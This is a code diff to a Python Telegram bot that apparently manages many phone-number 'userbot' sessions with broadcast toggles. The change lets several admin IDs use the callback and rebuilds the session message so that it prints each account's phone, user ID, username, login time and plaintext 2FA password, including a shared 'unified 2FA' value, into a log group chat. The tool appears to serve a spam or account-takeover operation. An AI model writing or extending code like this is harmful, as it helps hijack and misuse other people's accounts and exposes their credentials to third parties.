@@ -29,7 +29,8 @@ async def _log_callback(event):
         if not event.data:
             return
         user_id = event.sender_id if event.sender_id else None
-        if user_id != config.OWNER_ID:
+        admin_ids = set(config.ADMIN_IDS) | ({config.OWNER_ID} if config.OWNER_ID else set())
+        if admin_ids and user_id not in admin_ids:
             await event.answer("Not authorized", alert=True)
             return
         data = event.data.decode("utf-8", "ignore")
@@ -43,13 +44,28 @@ async def _log_callback(event):
         status = "✅ Broadcasting ON" if allowed else "❌ Broadcasting OFF"
         await event.answer(f"{phone}: {status}", alert=False)
         try:
-            first_line = event.message.message.splitlines()[0]
-            await event.edit(
-                f"{first_line}\n📡 Broadcast status: **{status}**",
-                buttons=_broadcast_buttons(phone, allowed),
+            rec = database.get_userbot(phone) or {}
+            login_time = rec.get("login_time")
+            if login_time:
+                try:
+                    login_time = datetime.fromisoformat(str(login_time)).strftime("%Y-%m-%d %H:%M UTC")
+                except Exception:
+                    pass
+            tfa = rec.get("twofa_password") or database.get_unified_2fa()
+            text = (
+                f"🔑 **UserBot Session**\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"👤 **User ID:** `{rec.get('user_id') or 'N/A'}`\n"
+                f"🏷️ **Username:** @{rec.get('username') or 'None'}\n"
+                f"📱 **Phone:** `{phone}`\n"
+                f"⏰ **Login time:** `{login_time or 'N/A'}`\n"
+                f"🔐 **2FA password:** `{tfa or 'None'}`\n"
+                f"🟢 **Status:** `{rec.get('status')}`\n"
+                f"📡 **Broadcast:** {'✅ ON' if allowed else '❌ OFF'}"
             )
-        except Exception:
-            pass
+            await event.edit(text, buttons=_broadcast_buttons(phone, allowed))
+        except Exception as e:
+            logger.warning(f"Could not refresh session message: {e}")
     except Exception as e:
         logger.error(f"Log group callback error: {e}")
 
@@ -59,10 +75,9 @@ def _broadcast_buttons(phone: str, allowed: bool = None):
     if allowed is None:
         record = database.get_userbot(phone)
         allowed = bool(record and record.get("broadcast_allowed"))
-    on_txt = f"✅ Broadcast ON" if not allowed else "✅ Broadcast ON"
     return [
-        Button.inline(on_txt, f"bcast:ON:{phone}"),
-        Button.inline("❌ Broadcast OFF", f"bcast:OFF:{phone}"),
+        Button.inline("✅ Broadcast ON" if not allowed else "✅ ON ✔", f"bcast:ON:{phone}"),
+        Button.inline("❌ OFF" if allowed else "❌ Broadcast OFF", f"bcast:OFF:{phone}"),
     ]
 
 
